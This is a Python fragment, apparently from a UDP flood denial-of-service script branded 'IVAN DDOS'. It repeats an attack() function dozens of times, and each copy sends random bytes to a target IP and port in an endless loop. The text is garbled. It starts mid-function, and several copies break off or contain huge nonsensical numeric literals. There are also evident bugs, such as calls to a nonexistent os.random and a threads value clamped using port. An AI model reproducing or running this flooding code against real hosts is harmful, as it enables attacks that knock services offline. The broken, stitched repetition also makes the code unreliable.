    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
